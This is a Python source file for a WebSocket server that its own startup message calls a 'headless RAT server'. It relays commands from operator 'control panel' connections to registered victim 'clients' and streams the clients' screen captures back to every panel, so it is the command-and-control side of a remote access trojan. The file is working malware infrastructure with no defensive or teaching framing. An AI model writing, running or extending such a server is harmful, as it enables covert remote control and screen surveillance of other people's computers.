import asyncio
import websockets
import ssl
import pathlib
import json
import os

CONNECTED_CLIENTS = {}
CONNECTED_PANELS = []

async def broadcast_client_list():
    """Sends the current list of clients to all connected panels."""
    if not CONNECTED_PANELS:
        return
        
    client_list = {
        client_id: {"hostname": info["hostname"]}
        for client_id, info in CONNECTED_CLIENTS.items()
    }
    
    list_payload = json.dumps({"type": "client_list", "clients": client_list})
    
    # Use asyncio.gather to send to all panels concurrently
    await asyncio.gather(*[panel.send(list_payload) for panel in CONNECTED_PANELS])

async def route_message(websocket, initial_data):
    """Main message routing loop after a party has been identified."""
    role = initial_data.get("role")
    client_id = initial_data.get("id")

    try:
        while True:
            message = await websocket.recv()
            data = json.loads(message)

            if role == "panel":
                # Panel is sending a command for a specific client
                target_client_id = data.get("target_id")
                if target_client_id and target_client_id in CONNECTED_CLIENTS:
                    await CONNECTED_CLIENTS[target_client_id]["ws"].send(json.dumps(data))

            elif role == "client":
                # Client is sending screen data, broadcast to all panels
                payload = json.dumps({
                    "type": "screen_data",
                    "session_id": client_id,
                    "data": data.get("data"),
                    "width": data.get("width"),
                    "height": data.get("height")
                })
                if CONNECTED_PANELS:
                    await asyncio.gather(*[panel.send(payload) for panel in CONNECTED_PANELS])

    except websockets.ConnectionClosed:
        print(f"[!] {role.capitalize()} '{client_id}' disconnected.")

async def handler(websocket, path):
    print(f"[*] New connection from {websocket.remote_address}")
    initial_data = None
    try:
        initial_message = await websocket.recv()
        initial_data = json.loads(initial_message)
        role = initial_data.get("role")

        if role == "panel":
            CONNECTED_PANELS.append(websocket)
            print(f"[*] Control Panel connected. Total panels: {len(CONNECTED_PANELS)}")
            await broadcast_client_list()
            await route_message(websocket, initial_data)
        
        elif role == "client":
            client_id = initial_data.get("id")
            hostname = initial_data.get("hostname", "Unknown")
            CONNECTED_CLIENTS[client_id] = {"ws": websocket, "hostname": hostname}
            print(f"[*] Client '{hostname}' ({client_id}) connected. Total clients: {len(CONNECTED_CLIENTS)}")
            await broadcast_client_list()
            await route_message(websocket, initial_data)
        
        else:
            await websocket.close(1011, "Unknown role.")

    finally:
        if initial_data:
            role = initial_data.get("role")
            if role == "panel" and websocket in CONNECTED_PANELS:
                CONNECTED_PANELS.remove(websocket)
                print("[*] Control Panel disconnected.")
            elif role == "client":
                client_id = initial_data.get("id")
                if client_id in CONNECTED_CLIENTS:
                    del CONNECTED_CLIENTS[client_id]
                    print(f"[*] Client '{client_id}' disconnected.")
                    await broadcast_client_list()

async def main():
    secret_path = pathlib.Path("/etc/secrets/")
    local_path = pathlib.Path(__file__).with_name("certs")
    if secret_path.exists() and (secret_path / "cert.pem").exists():
        certfile, keyfile = secret_path / "cert.pem", secret_path / "key.pem"
    else:
        certfile, keyfile = local_path / "cert.pem", local_path / "key.pem"
    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(certfile, keyfile)
    except FileNotFoundError:
        print(f"[!!!] FATAL ERROR: Certificate files not found.")
        return
    host = "0.0.0.0"
    port = int(os.environ.get("PORT", 8765))
    print(f"[*] Starting headless RAT server on wss://{host}:{port}")
    async with websockets.serve(handler, host, port, ssl=ssl_context, max_size=None):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())